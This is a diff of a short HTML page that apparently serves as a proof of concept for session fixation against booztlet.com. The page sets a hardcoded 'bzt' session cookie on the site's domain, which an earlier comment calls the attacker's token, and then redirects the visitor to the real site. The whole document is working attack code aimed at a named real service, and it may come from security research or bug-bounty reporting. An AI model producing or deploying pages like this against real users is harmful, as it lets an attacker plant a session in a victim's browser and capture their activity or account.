@@ -1,19 +1,15 @@
+<!DOCTYPE html>
 <html>
-  <body>
+  <head>
+    <title>Redirecting...</title>
     <script>
-      // Replace this with your attacker's token
-      const attackerBzt = "2%3A281299707%3A1754059731%3A31ba471d5988d2c56732fccac92cc043";  // Use exact value from real attacker cookie
-
-      // Set the bzt cookie
-      document.cookie = "bzt=" + attackerBzt + "; path=/; domain=.booztlet.com; Secure; SameSite=None";
-
-      // Debug log (optional)
-      console.log("Cookie set: ", document.cookie);
-
-      // Redirect to Booztlet after short delay to ensure cookie sets
-      setTimeout(() => {
-        window.location.href = "https://www.booztlet.com";
-      }, 500);
+      // Set the session ID via JavaScript
+      document.cookie = "bzt=2%3A281299707%3A1754125251%3A4fbf4effc5db3549457dc76f217a1d9e; path=/; domain=.booztlet.com";
+      // Redirect to the target site
+      window.location.href = "https://www.booztlet.com";
     </script>
+  </head>
+  <body>
+    <p>Redirecting to Booztlet...</p>
   </body>
 </html>
